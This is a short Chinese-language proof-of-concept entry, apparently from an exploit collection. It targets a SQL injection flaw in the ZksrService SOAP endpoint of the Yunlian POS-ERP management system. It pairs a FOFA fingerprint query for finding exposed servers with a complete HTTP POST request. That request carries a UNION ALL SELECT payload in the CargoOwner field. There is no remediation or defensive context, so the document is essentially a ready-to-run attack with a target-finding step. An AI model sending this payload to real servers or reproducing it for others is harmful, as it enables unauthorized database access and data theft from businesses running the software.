# 云连POS-ERP管理系统ZksrService存在SQL注入漏洞

云连POS-ERP管理系统ZksrService存在SQL注入漏洞

## fofa
```javascript
title="Powered By chaosZ"
```

## poc
```javascript
POST /services/ZksrService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
SOAPAction: ""
Content-Type: text/xml; charset=UTF-8
Connection: close

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.service.chaosZ.com">
<soapenv:Header/>
    <soapenv:Body>
        <web:getItemInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <data xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{"CargoOwner":"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(72)+CHAR(107)+CHAR(78)+CHAR(109)+CHAR(100)+CHAR(82)+CHAR(69)+CHAR(83)+CHAR(118)+CHAR(67)+CHAR(88)+CHAR(109)+CHAR(100)+CHAR(97)+CHAR(105)+CHAR(115)+CHAR(65)+CHAR(107)+CHAR(117)+CHAR(84)+CHAR(74)+CHAR(100)+CHAR(114)+CHAR(116)+CHAR(109)+CHAR(106)+CHAR(119)+CHAR(88)+CHAR(65)+CHAR(108)+CHAR(117)+CHAR(110)+CHAR(109)+CHAR(118)+CHAR(106)+CHAR(65)+CHAR(77)+CHAR(68)+CHAR(112)+CHAR(74)+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(122)+CHAR(113),NULL-- qfYz"}
            </data>
        </web:getItemInfo>
    </soapenv:Body>
</soapenv:Envelope>
```

![image-20241219151045261](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191510339.png)